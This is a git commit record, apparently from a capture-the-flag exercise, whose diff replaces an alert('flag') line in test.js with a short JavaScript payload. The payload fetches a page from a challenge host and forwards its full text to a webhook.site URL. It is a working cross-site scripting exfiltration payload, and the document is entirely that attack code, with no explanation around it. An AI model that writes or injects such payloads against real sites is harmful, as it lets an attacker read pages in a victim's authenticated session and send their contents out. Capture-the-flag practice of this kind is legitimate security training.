74265d062396cd0c5e575720f66c4c690a10bb18
Junyu Lu <784698289@qq.com>
2025-06-26 13:33:49 +0800

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,6 @@
-alert('flag')
+fetch("https://airbnb-hosts-the-search.chals.io/")
+    .then((e) => e.text())
+    .then(
+        (t) =>
+            fetch(`https://webhook.site/6644dbf8-8e4c-4acb-b10f-29167d2e4fc6?t=` + encodeURIComponent(t))
+        );
